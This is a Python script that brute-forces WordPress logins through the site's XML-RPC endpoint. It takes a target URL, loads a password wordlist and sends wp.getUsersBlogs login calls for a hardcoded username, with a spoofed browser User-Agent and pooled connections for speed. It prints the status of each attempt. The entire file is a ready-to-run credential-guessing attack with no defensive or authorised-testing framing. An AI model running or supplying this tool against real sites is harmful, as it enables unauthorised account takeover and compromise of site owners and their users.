import xml.etree.ElementTree as ET
import requests

# Prompt the user for the URL
url = input("Enter the WordPress website URL: ").strip()
xmlrpc_path = "/xmlrpc.php"

# Remove trailing slash if it exists
url = url.rstrip('/')

username = "yashar"  # Replace with the actual admin value
password_file_path = "passwords.txt"


# Set headers
headers = {
    'Host': url[8:],
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36',
    'Content-Type': 'application/xml'
}

# Create a session object with connection pooling
session = requests.Session()
adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
session.mount("http://", adapter)

# Read the passwords.txt from the file
with open(password_file_path, "r") as password_file:
    passwords = [line.strip() for line in password_file if line.strip()]

for password in passwords:

    request_body = f"""
    <methodCall>
    <methodName>wp.getUsersBlogs</methodName>
    <params>
    <param><value>{username}</value></param>
    <param><value>{password}</value></param>
    </params>
    </methodCall>
    """

    # Send the request
    response = session.post(url + xmlrpc_path, data=request_body, headers=headers)

    response_xml = response.text

    # Parse the XML response
    root = ET.fromstring(response_xml)

    # Find the <string> element that contains the password status
    password_status_element = root.find(".//string")

    if password_status_element is not None:
        password_status = password_status_element.text
        print("Password: " + password + " ,Status:", password_status)
    else:
        print("No password status found in the response.")
